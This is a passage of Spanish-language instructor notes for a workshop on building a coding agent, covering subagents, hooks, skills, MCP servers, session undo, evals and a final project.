DI: «Delegar es comprar contexto. El subagente se gasta 30.000 tokens explorando el repositorio, y al principal solo le vuelven 300: el resumen.»

▸ «Es una tool más: `task`, con una descripción, un prompt y el tipo de agente.»
▸ «El hijo arranca con contexto limpio, sus propias tools y su propio prompt.»
▸ «Los perfiles se definen en Markdown con frontmatter: nombre, descripción, tools permitidas y el prompt. Como el `reviewer` de la diapositiva.»
▸ «Viene uno integrado, `explore`, solo lectura. Y no se permite `task` dentro de `task`: nada de recursión.»
▸ «Lo más importante: el subagente no ve vuestra conversación. El prompt que le pasa el principal tiene que ser autocontenido. Por eso la descripción de la tool lo dice explícitamente.»

DEMO: `/context` antes y después de una exploración con subagente («usa un subagente para encontrar todos los sitios donde se redondea») frente a hacer la misma exploración en el principal.


## 39. Manos a la obra: subagents.py  `#l09-practica`

[30 min]

DI: «Dos TODOs en `subagents.py`: cargar perfiles desde Markdown y la tool `task`.»

PREPARA: copiar `examples/project/.forja` al playground (en Windows: `xcopy /E /I examples\project\.forja playground\.forja`).

PISTAS:
▸ «El catálogo de perfiles va en la descripción de la tool `task`: así el modelo sabe qué agentes hay.»
▸ «Las tools del hijo son un subconjunto de las del padre, filtradas por el perfil, y siempre sin `task`.»

CHECKPOINT: «Veréis las tool calls del hijo con prefijo `[explore]` y que el contexto del principal apenas crece. Probad también: "pide al subagente reviewer que revise mis cambios sin commitear".»


## 40. Extensibilidad: hooks, skills y MCP  `#l10`

[Portada lab 10 · 70 min · El más denso del día 2.]

DI: «Lab 10: extensibilidad. Hooks, skills y MCP. Es como adaptáis el agente a vuestro equipo sin tocar su núcleo, y es la misma convención que usan los agentes comerciales: lo que aprendáis aquí os sirve allí.»


## 41. AGENTS.md pide; un hook impide  `#l10-teoria`

[15 min]

DI: «La frase del lab: AGENTS.md pide; un hook impide.»

HOOKS:
▸ «Son comandos que se ejecutan en cuatro momentos: antes de una tool (PreToolUse), después (PostToolUse), al enviar el usuario un mensaje y cuando el agente quiere terminar (Stop).»
▸ «Reciben un JSON por la entrada estándar con qué tool y qué argumentos. Si terminan con código de salida 2, bloquean, y lo que escriban en stderr vuelve al modelo como explicación. Exit 1 no bloquea: es un error del hook.»
▸ «Ejemplos del repo: un hook que bloquea escribir secretos y un hook Stop que no deja terminar si los tests están en rojo. Eso no se lo pedís al modelo por favor: se lo imponéis.»

SKILLS:
▸ «Una carpeta con un SKILL.md. En el contexto solo va el nombre y la descripción; el cuerpo se carga cuando el modelo decide que lo necesita. Divulgación progresiva: podéis tener cien skills sin llenar el contexto.»

MCP:
▸ «Servidores externos, por stdio o HTTP, que aportan tools. Aparecen como `mcp__servidor__tool` y por defecto con riesgo exec: piden permiso.»

DEMO: copia `examples/project/.forja` al playground. 1) Rompe un test y pide «termina»: el hook Stop no le deja. 2) «haz commit»: carga la skill conventional-commits. 3) «arregla la issue #12 y coméntala»: usa el MCP de issues.


## 42. Manos a la obra: hooks.py  `#l10-practica`

[50 min · Semáforo a los 30.]

DI: «Cinco TODOs: en `hooks.py`, qué hooks aplican y ejecutarlos traduciendo los códigos de salida; en `skills.py`, descubrir skills y cargarlas; en `mcp_tools.py`, el nombre con espacio de nombres.»

PISTAS:
▸ «Un hook sin matcher aplica a todas las tools.»
▸ «Los comandos de los hooks se ejecutan en la raíz del proyecto: cuidado con las rutas relativas.»
▸ «Solo el exit 2 bloquea.»

CHECKPOINT: «El hook Stop no deja terminar con tests en rojo; el agente carga la skill antes del commit; y en `/tools` aparecen las `mcp__issues__*`.»

Antes de comer: «Después de comer: sesiones, evals y el proyecto final. Pensad durante la comida qué hook o skill os sería útil en vuestro trabajo.»


## 43. Sesiones y deshacer  `#l11`

[14:20 · Portada lab 11 · 35 min]

DI: «Lab 11: sesiones y deshacer. Corto pero imprescindible para usarlo en un repositorio de verdad: todo lo que hace el agente tiene que poder auditarse y deshacerse.»


## 44. Auditable y reversible  `#l11-teoria`

[8 min]

▸ Transcript: «Cada mensaje se guarda en un fichero JSONL por sesión en `~/.forja/sessions`. Sirve para dos cosas: auditar qué hizo el agente y retomar con `--resume`, que reconstruye el historial respetando las compactaciones.»
▸ Checkpoints: «Antes de cada escritura guardamos el contenido original del fichero. `/undo` revierte el último turno completo: todos los ficheros que tocó.»
▸ Límite: «Lo que hace bash no se puede deshacer: si borró algo o hizo un push, `/undo` no lo arregla. Por eso bash pasa por permisos. Las dos piezas se complementan.»

DEMO: una edición, `/undo`, `/sessions`, salir y `forja --resume <id>`.

PREGUNTA: «¿Qué haríais para poder deshacer también bash?» (Git stash / commits automáticos por turno, contenedores… buen debate de 1 minuto.)


## 45. Manos a la obra: session.py  `#l11-practica`

[25 min]

DI: «Cuatro TODOs en `session.py`: añadir al transcript, cargarlo respetando las marcas de compactación, guardar antes de escribir y deshacer.»

PISTAS:
▸ «`before_write` guarda el original solo la primera vez que se toca un fichero en el turno; si el fichero no existía, apuntad que hay que borrarlo al deshacer.»
▸ «`load`: si hay una marca de compactación, el historial empieza en ella.»

CHECKPOINT: «"cambia el vencimiento por defecto a 60 días", `/undo`, comprobad que el fichero vuelve a estar como antes; `/sessions` y `--resume`.»


## 46. Evals: medir tu agente  `#l12`

[14:55 · Portada lab 12 · 65 min · LANZA LAS EVALS DEL TUTOR AHORA, tardan.]

ACCIÓN: en tu terminal, `python scripts/tasks.py evals --repeat 3` con dos modelos (uno detrás de otro) para tener resultados al final del lab.

DI: «Lab 12: evals. Hasta ahora, cuando os he preguntado qué modelo iba mejor, todos teníais una opinión. Ahora vamos a tener datos.»


## 47. Sin medir, todo es opinión  `#l12-teoria`

[12 min]

DI: «Una eval es una tarea real con una forma objetiva de comprobar si se hizo bien. Mirad el YAML.»
▸ «Cada tarea se ejecuta en una copia limpia del playground, en modo bypass: nadie aprueba nada, es automático.»
▸ «Tests ocultos: la tarea de descuentos se comprueba con un test que el agente no ve. Si los viera, podría escribir código que pasa ese test concreto y nada más.»
▸ «`forbid_changes`: no vale "arreglar" los tests borrándolos o cambiándolos. Si el agente toca `tests/`, suspende.»
▸ «`answer_contains`: para preguntas, comprobamos que la respuesta contenga el dato.»
▸ «`--repeat 3`: los agentes son estocásticos. Una ejecución que sale bien no demuestra nada.»

DI: «Con esto podéis comparar modelos, prompts y cambios del harness. ¿El AGENTS.md mejora? ¿La compactación empeora? ¿El modelo de 30B compensa frente al de 8B? Se mide.»

PREGUNTA: «¿Qué tarea de vuestro día a día convertiríais en eval?» → semilla del proyecto final.


## 48. Manos a la obra: evals.py  `#l12-practica`

[40 min]

DI: «Dos TODOs en `evals.py`: `grade`, que aplica las comprobaciones, y `summarize`, que calcula tasa de éxito por tarea, pasos, tiempo y tokens.»

LUEGO: «`python scripts/tasks.py evals --only fix_rounding` para probar una; después `--repeat 3`; y si tenéis dos modelos, comparadlos.»

CIERRE DEL LAB (10 min): proyecta tus resultados. Recupera la tabla del hito de ayer: «¿Coincide lo que pensabais ayer con los números? ¿El modelo "que iba mejor" sigue ganando con tres repeticiones?» Casi siempre hay sorpresas: coméntalas.

DI: «Moraleja: sin medir, todo es opinión.»


## 49. Tu Forja, para tu forma de trabajar  `#final`

[16:00 · 60 min: 45 de trabajo + demos de 3 min.]

DI: «Proyecto final: vuestra Forja, para vuestra forma de trabajar. La rúbrica está en la diapositiva y en el cuaderno.»
▸ «Un AGENTS.md útil para un repositorio real vuestro: 1 punto.»
▸ «Una skill de vuestro equipo —convenciones, despliegue, revisión—: 2 puntos.»
▸ «Un hook que garantice algo que hoy pedís por favor —tests, linter, secretos—: 2 puntos.»
▸ «Un subagente especializado: 2 puntos.»
▸ «Una tarea de eval que represente vuestro trabajo diario, con resultados de dos modelos: 3 puntos. Es lo que más vale porque es lo que convierte opiniones en decisiones.»

DI: «A las 16:45, demos de tres minutos: qué habéis hecho y un número.»

DURANTE LAS DEMOS: prioriza las que traen datos de evals; pregunta a cada uno «¿qué cambiarías mañana en tu equipo con esto?».


## 50. El modelo se cambia. El harness es tuyo.  `#cierre`

[17:00 · 5 min]

DI: «Me quedo con tres ideas.»
▸ «Agente es modelo más tools más bucle. Todo lo demás —control, contexto, extensión— es harness, y el harness es vuestro.»
▸ «Lo que importa se garantiza con permisos y hooks, no con prompts. Un prompt pide; un hook impide.»
▸ «Medid. Un modelo nuevo, un cambio de prompt o una skill: con evals sabéis si mejora.»

DI: «Los modelos van a seguir cambiando cada pocos meses. Lo que habéis construido estos dos días sirve con el siguiente.»

RETO: «Reto a dos semanas: usad vuestra Forja en un repositorio real con un AGENTS.md, una skill y un hook, y traedme el informe de evals. Os escribo para ver cómo va.»

DI: «Gracias. La encuesta está en [enlace]; me ayuda mucho. Y el repositorio es vuestro: seguid construyendo.»
